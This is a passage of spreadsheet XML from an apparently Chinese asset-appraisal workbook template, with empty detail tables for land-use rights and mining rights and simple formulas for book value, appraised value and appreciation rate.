          <t>土地权证编号</t>
        </is>
      </c>
      <c r="D5" s="177" t="inlineStr">
        <is>
          <t>宗地名称</t>
        </is>
      </c>
      <c r="E5" s="177" t="inlineStr">
        <is>
          <t>土地位置</t>
        </is>
      </c>
      <c r="F5" s="177" t="inlineStr">
        <is>
          <t>取得日期</t>
        </is>
      </c>
      <c r="G5" s="177" t="inlineStr">
        <is>
          <t>用地性质</t>
        </is>
      </c>
      <c r="H5" s="177" t="inlineStr">
        <is>
          <t>土地用途</t>
        </is>
      </c>
      <c r="I5" s="177" t="inlineStr">
        <is>
          <t>准用年限</t>
        </is>
      </c>
      <c r="J5" s="177" t="inlineStr">
        <is>
          <t>开发程度</t>
        </is>
      </c>
      <c r="K5" s="177" t="inlineStr">
        <is>
          <t>面积(m2)</t>
        </is>
      </c>
      <c r="L5" s="177" t="inlineStr">
        <is>
          <t>原始入账价值</t>
        </is>
      </c>
      <c r="M5" s="178" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="N5" s="177" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="O5" s="177" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="P5" s="177" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="Q5" s="264" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="380" t="n"/>
      <c r="D6" s="180" t="n"/>
      <c r="E6" s="381" t="n"/>
      <c r="F6" s="578" t="n"/>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="380" t="n"/>
      <c r="I6" s="380" t="n"/>
      <c r="J6" s="380" t="n"/>
      <c r="K6" s="555" t="n"/>
      <c r="L6" s="555" t="n"/>
      <c r="M6" s="555" t="n"/>
      <c r="N6" s="555" t="n"/>
      <c r="O6" s="555">
        <f>N6-M6</f>
        <v/>
      </c>
      <c r="P6" s="615">
        <f>IF(M6=0,"",O6/M6*100)</f>
        <v/>
      </c>
      <c r="Q6" s="423" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="380" t="n"/>
      <c r="D7" s="180" t="n"/>
      <c r="E7" s="381" t="n"/>
      <c r="F7" s="578" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="380" t="n"/>
      <c r="I7" s="380" t="n"/>
      <c r="J7" s="380" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="555" t="n"/>
      <c r="N7" s="555" t="n"/>
      <c r="O7" s="555">
        <f>N7-M7</f>
        <v/>
      </c>
      <c r="P7" s="615">
        <f>IF(M7=0,"",O7/M7*100)</f>
        <v/>
      </c>
      <c r="Q7" s="423" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="380" t="n"/>
      <c r="D8" s="180" t="n"/>
      <c r="E8" s="381" t="n"/>
      <c r="F8" s="578" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="380" t="n"/>
      <c r="I8" s="380" t="n"/>
      <c r="J8" s="380" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555" t="n"/>
      <c r="N8" s="555" t="n"/>
      <c r="O8" s="555">
        <f>N8-M8</f>
        <v/>
      </c>
      <c r="P8" s="615">
        <f>IF(M8=0,"",O8/M8*100)</f>
        <v/>
      </c>
      <c r="Q8" s="423" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="380" t="n"/>
      <c r="D9" s="180" t="n"/>
      <c r="E9" s="381" t="n"/>
      <c r="F9" s="578" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="380" t="n"/>
      <c r="I9" s="380" t="n"/>
      <c r="J9" s="380" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="555" t="n"/>
      <c r="N9" s="555" t="n"/>
      <c r="O9" s="555">
        <f>N9-M9</f>
        <v/>
      </c>
      <c r="P9" s="615">
        <f>IF(M9=0,"",O9/M9*100)</f>
        <v/>
      </c>
      <c r="Q9" s="423" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="380" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="381" t="n"/>
      <c r="F10" s="578" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="380" t="n"/>
      <c r="I10" s="380" t="n"/>
      <c r="J10" s="380" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="555" t="n"/>
      <c r="N10" s="555" t="n"/>
      <c r="O10" s="555">
        <f>N10-M10</f>
        <v/>
      </c>
      <c r="P10" s="615">
        <f>IF(M10=0,"",O10/M10*100)</f>
        <v/>
      </c>
      <c r="Q10" s="423" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="380" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="381" t="n"/>
      <c r="F11" s="578" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="380" t="n"/>
      <c r="I11" s="380" t="n"/>
      <c r="J11" s="380" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="555" t="n"/>
      <c r="N11" s="555" t="n"/>
      <c r="O11" s="555">
        <f>N11-M11</f>
        <v/>
      </c>
      <c r="P11" s="615">
        <f>IF(M11=0,"",O11/M11*100)</f>
        <v/>
      </c>
      <c r="Q11" s="423" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="380" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="381" t="n"/>
      <c r="F12" s="578" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="380" t="n"/>
      <c r="I12" s="380" t="n"/>
      <c r="J12" s="380" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="555" t="n"/>
      <c r="N12" s="555" t="n"/>
      <c r="O12" s="555">
        <f>N12-M12</f>
        <v/>
      </c>
      <c r="P12" s="615">
        <f>IF(M12=0,"",O12/M12*100)</f>
        <v/>
      </c>
      <c r="Q12" s="423" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="380" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="381" t="n"/>
      <c r="F13" s="578" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="380" t="n"/>
      <c r="I13" s="380" t="n"/>
      <c r="J13" s="380" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="555" t="n"/>
      <c r="N13" s="555" t="n"/>
      <c r="O13" s="555">
        <f>N13-M13</f>
        <v/>
      </c>
      <c r="P13" s="615">
        <f>IF(M13=0,"",O13/M13*100)</f>
        <v/>
      </c>
      <c r="Q13" s="423" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="380" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="381" t="n"/>
      <c r="F14" s="578" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="380" t="n"/>
      <c r="I14" s="380" t="n"/>
      <c r="J14" s="380" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="555" t="n"/>
      <c r="N14" s="555" t="n"/>
      <c r="O14" s="555">
        <f>N14-M14</f>
        <v/>
      </c>
      <c r="P14" s="615">
        <f>IF(M14=0,"",O14/M14*100)</f>
        <v/>
      </c>
      <c r="Q14" s="423" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="380" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="381" t="n"/>
      <c r="F15" s="578" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="380" t="n"/>
      <c r="I15" s="380" t="n"/>
      <c r="J15" s="380" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="555" t="n"/>
      <c r="N15" s="555" t="n"/>
      <c r="O15" s="555">
        <f>N15-M15</f>
        <v/>
      </c>
      <c r="P15" s="615">
        <f>IF(M15=0,"",O15/M15*100)</f>
        <v/>
      </c>
      <c r="Q15" s="423" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="380" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="381" t="n"/>
      <c r="F16" s="578" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="380" t="n"/>
      <c r="I16" s="380" t="n"/>
      <c r="J16" s="380" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="555" t="n"/>
      <c r="N16" s="555" t="n"/>
      <c r="O16" s="555">
        <f>N16-M16</f>
        <v/>
      </c>
      <c r="P16" s="615">
        <f>IF(M16=0,"",O16/M16*100)</f>
        <v/>
      </c>
      <c r="Q16" s="423" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="380" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="381" t="n"/>
      <c r="F17" s="578" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="380" t="n"/>
      <c r="I17" s="380" t="n"/>
      <c r="J17" s="380" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="555" t="n"/>
      <c r="N17" s="555" t="n"/>
      <c r="O17" s="555">
        <f>N17-M17</f>
        <v/>
      </c>
      <c r="P17" s="615">
        <f>IF(M17=0,"",O17/M17*100)</f>
        <v/>
      </c>
      <c r="Q17" s="423" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="380" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="381" t="n"/>
      <c r="F18" s="578" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="380" t="n"/>
      <c r="I18" s="380" t="n"/>
      <c r="J18" s="380" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="555" t="n"/>
      <c r="N18" s="555" t="n"/>
      <c r="O18" s="555">
        <f>N18-M18</f>
        <v/>
      </c>
      <c r="P18" s="615">
        <f>IF(M18=0,"",O18/M18*100)</f>
        <v/>
      </c>
      <c r="Q18" s="423" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="380" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="381" t="n"/>
      <c r="F19" s="578" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="380" t="n"/>
      <c r="I19" s="380" t="n"/>
      <c r="J19" s="380" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="555" t="n"/>
      <c r="N19" s="555" t="n"/>
      <c r="O19" s="555">
        <f>N19-M19</f>
        <v/>
      </c>
      <c r="P19" s="615">
        <f>IF(M19=0,"",O19/M19*100)</f>
        <v/>
      </c>
      <c r="Q19" s="423" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="380" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="381" t="n"/>
      <c r="F20" s="578" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="380" t="n"/>
      <c r="I20" s="380" t="n"/>
      <c r="J20" s="380" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="555" t="n"/>
      <c r="N20" s="555" t="n"/>
      <c r="O20" s="555">
        <f>N20-M20</f>
        <v/>
      </c>
      <c r="P20" s="615">
        <f>IF(M20=0,"",O20/M20*100)</f>
        <v/>
      </c>
      <c r="Q20" s="423" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="380" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="381" t="n"/>
      <c r="F21" s="578" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="380" t="n"/>
      <c r="I21" s="380" t="n"/>
      <c r="J21" s="380" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="555" t="n"/>
      <c r="N21" s="555" t="n"/>
      <c r="O21" s="555">
        <f>N21-M21</f>
        <v/>
      </c>
      <c r="P21" s="615">
        <f>IF(M21=0,"",O21/M21*100)</f>
        <v/>
      </c>
      <c r="Q21" s="423" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="380" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="381" t="n"/>
      <c r="F22" s="578" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="380" t="n"/>
      <c r="I22" s="380" t="n"/>
      <c r="J22" s="380" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="555" t="n"/>
      <c r="N22" s="555" t="n"/>
      <c r="O22" s="555">
        <f>N22-M22</f>
        <v/>
      </c>
      <c r="P22" s="615">
        <f>IF(M22=0,"",O22/M22*100)</f>
        <v/>
      </c>
      <c r="Q22" s="423" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="380" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="381" t="n"/>
      <c r="F23" s="578" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="380" t="n"/>
      <c r="I23" s="380" t="n"/>
      <c r="J23" s="380" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="555" t="n"/>
      <c r="N23" s="555" t="n"/>
      <c r="O23" s="555">
        <f>N23-M23</f>
        <v/>
      </c>
      <c r="P23" s="615">
        <f>IF(M23=0,"",O23/M23*100)</f>
        <v/>
      </c>
      <c r="Q23" s="423" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="380" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="381" t="n"/>
      <c r="F24" s="578" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="380" t="n"/>
      <c r="I24" s="380" t="n"/>
      <c r="J24" s="380" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="555" t="n"/>
      <c r="N24" s="555" t="n"/>
      <c r="O24" s="555">
        <f>N24-M24</f>
        <v/>
      </c>
      <c r="P24" s="615">
        <f>IF(M24=0,"",O24/M24*100)</f>
        <v/>
      </c>
      <c r="Q24" s="423" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="380" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="381" t="n"/>
      <c r="F25" s="578" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="380" t="n"/>
      <c r="I25" s="380" t="n"/>
      <c r="J25" s="380" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="555" t="n"/>
      <c r="N25" s="555" t="n"/>
      <c r="O25" s="555">
        <f>N25-M25</f>
        <v/>
      </c>
      <c r="P25" s="615">
        <f>IF(M25=0,"",O25/M25*100)</f>
        <v/>
      </c>
      <c r="Q25" s="423" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="380" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="381" t="n"/>
      <c r="F26" s="578" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="380" t="n"/>
      <c r="I26" s="380" t="n"/>
      <c r="J26" s="380" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555" t="n"/>
      <c r="M26" s="555" t="n"/>
      <c r="N26" s="555" t="n"/>
      <c r="O26" s="555">
        <f>N26-M26</f>
        <v/>
      </c>
      <c r="P26" s="615">
        <f>IF(M26=0,"",O26/M26*100)</f>
        <v/>
      </c>
      <c r="Q26" s="423" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="380" t="n"/>
      <c r="D27" s="381" t="n"/>
      <c r="E27" s="381" t="n"/>
      <c r="F27" s="578" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="380" t="n"/>
      <c r="I27" s="380" t="n"/>
      <c r="J27" s="380" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555" t="n"/>
      <c r="M27" s="555" t="n"/>
      <c r="N27" s="555" t="n"/>
      <c r="O27" s="555">
        <f>N27-M27</f>
        <v/>
      </c>
      <c r="P27" s="615">
        <f>IF(M27=0,"",O27/M27*100)</f>
        <v/>
      </c>
      <c r="Q27" s="423" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合      计</t>
        </is>
      </c>
      <c r="C28" s="593" t="n"/>
      <c r="D28" s="593" t="n"/>
      <c r="E28" s="567" t="n"/>
      <c r="F28" s="578" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="380" t="n"/>
      <c r="J28" s="380" t="n"/>
      <c r="K28" s="555">
        <f>SUM(K6:K27)</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>SUM(L6:L27)</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>SUM(M6:M27)</f>
        <v/>
      </c>
      <c r="N28" s="555">
        <f>SUM(N6:N27)</f>
        <v/>
      </c>
      <c r="O28" s="555">
        <f>N28-M28</f>
        <v/>
      </c>
      <c r="P28" s="615">
        <f>IF(M28=0,"",O28/M28*100)</f>
        <v/>
      </c>
      <c r="Q28" s="423" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>减：土地使用权减值准备</t>
        </is>
      </c>
      <c r="C29" s="593" t="n"/>
      <c r="D29" s="593" t="n"/>
      <c r="E29" s="567" t="n"/>
      <c r="F29" s="578" t="n"/>
      <c r="G29" s="380" t="n"/>
      <c r="H29" s="380" t="n"/>
      <c r="I29" s="380" t="n"/>
      <c r="J29" s="380" t="n"/>
      <c r="K29" s="555" t="n"/>
      <c r="L29" s="555" t="n"/>
      <c r="M29" s="555" t="n"/>
      <c r="N29" s="555" t="n"/>
      <c r="O29" s="555">
        <f>N29-M29</f>
        <v/>
      </c>
      <c r="P29" s="615">
        <f>IF(M29=0,"",O29/M29*100)</f>
        <v/>
      </c>
      <c r="Q29" s="423" t="n"/>
    </row>
    <row r="30" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A30" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B30" s="380" t="inlineStr">
        <is>
          <t>合         计</t>
        </is>
      </c>
      <c r="C30" s="593" t="n"/>
      <c r="D30" s="593" t="n"/>
      <c r="E30" s="567" t="n"/>
      <c r="F30" s="115" t="n"/>
      <c r="G30" s="380" t="n"/>
      <c r="H30" s="380" t="n"/>
      <c r="I30" s="380" t="n"/>
      <c r="J30" s="380" t="n"/>
      <c r="K30" s="555">
        <f>K28-K29</f>
        <v/>
      </c>
      <c r="L30" s="555">
        <f>L28-L29</f>
        <v/>
      </c>
      <c r="M30" s="555">
        <f>M28-M29</f>
        <v/>
      </c>
      <c r="N30" s="555">
        <f>N28-N29</f>
        <v/>
      </c>
      <c r="O30" s="555">
        <f>N30-M30</f>
        <v/>
      </c>
      <c r="P30" s="615">
        <f>IF(M30=0,"",O30/M30*100)</f>
        <v/>
      </c>
      <c r="Q30" s="423" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="6">
    <mergeCell ref="P3:Q3"/>
    <mergeCell ref="B1:Q1"/>
    <mergeCell ref="B30:E30"/>
    <mergeCell ref="B29:E29"/>
    <mergeCell ref="B2:Q2"/>
    <mergeCell ref="B28:E28"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:Q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5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 codeName="Sheet72">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:O30"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A27"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="17.6"/>
  <cols>
    <col width="10.6666666666667" customWidth="1" style="415" min="2" max="2"/>
    <col width="19.6666666666667" customWidth="1" style="415" min="3" max="3"/>
    <col width="10.6666666666667" customWidth="1" style="415" min="4" max="4"/>
    <col width="8.33333333333333" customWidth="1" style="415" min="5" max="5"/>
    <col width="8.5" customWidth="1" style="415" min="6" max="6"/>
    <col width="7.16666666666667" customWidth="1" style="415" min="7" max="7"/>
    <col width="8.33333333333333" customWidth="1" style="415" min="8" max="8"/>
    <col width="10.6666666666667" customWidth="1" style="415" min="9" max="9"/>
    <col width="11.8333333333333" customWidth="1" style="415" min="10" max="10"/>
    <col width="15.6666666666667" customWidth="1" style="415" min="11" max="11"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="415" min="12" max="13"/>
    <col outlineLevel="1" width="8.16666666666667" customWidth="1" style="415" min="14" max="14"/>
    <col width="7.16666666666667" customWidth="1" style="415" min="15" max="15"/>
  </cols>
  <sheetData>
    <row r="1" ht="26" customHeight="1" s="415">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>无形资产—矿业权评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="16.5" customFormat="1" customHeight="1" s="16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373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="402" t="inlineStr">
        <is>
          <t>表4-13-2</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="16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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="28.5" customFormat="1" customHeight="1" s="165">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="177" t="inlineStr">
        <is>
          <t>名称、种类（探矿权/采矿权）</t>
        </is>
      </c>
      <c r="D5" s="167" t="inlineStr">
        <is>
          <t>勘查（采矿）许可证编号</t>
        </is>
      </c>
      <c r="E5" s="177" t="inlineStr">
        <is>
          <t>取得方式</t>
        </is>
      </c>
      <c r="F5" s="177" t="inlineStr">
        <is>
          <t>取得日期</t>
        </is>
      </c>
      <c r="G5" s="177" t="inlineStr">
        <is>
          <t>剩余有效年限</t>
        </is>
      </c>
      <c r="H5" s="177" t="inlineStr">
        <is>
          <t>勘查开发阶段</t>
        </is>
      </c>
      <c r="I5" s="177" t="inlineStr">
        <is>
          <t>核定（批准）生产规模</t>
        </is>
      </c>
      <c r="J5" s="616" t="inlineStr">
        <is>
          <t>原始入账价值</t>
        </is>
      </c>
      <c r="K5" s="617" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="L5" s="616" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="M5" s="616" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="N5" s="616" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="O5" s="177" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="380" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="380" t="n"/>
      <c r="F6" s="578" t="n"/>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="380" t="n"/>
      <c r="I6" s="380" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555" t="n"/>
      <c r="L6" s="555" t="n"/>
      <c r="M6" s="555">
        <f>L6-K6</f>
        <v/>
      </c>
      <c r="N6" s="615">
        <f>IF(K6=0,"",M6/K6*100)</f>
        <v/>
      </c>
      <c r="O6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="380" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="578" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="380" t="n"/>
      <c r="I7" s="380" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="555">
        <f>L7-K7</f>
        <v/>
      </c>
      <c r="N7" s="615">
        <f>IF(K7=0,"",M7/K7*100)</f>
        <v/>
      </c>
      <c r="O7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="380" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="578" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="380" t="n"/>
      <c r="I8" s="380" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555">
        <f>L8-K8</f>
        <v/>
      </c>
      <c r="N8" s="615">
        <f>IF(K8=0,"",M8/K8*100)</f>
        <v/>
      </c>
      <c r="O8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="380" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="578" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="380" t="n"/>
      <c r="I9" s="380" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="555">
        <f>L9-K9</f>
        <v/>
      </c>
      <c r="N9" s="615">
        <f>IF(K9=0,"",M9/K9*100)</f>
        <v/>
      </c>
      <c r="O9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="165">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
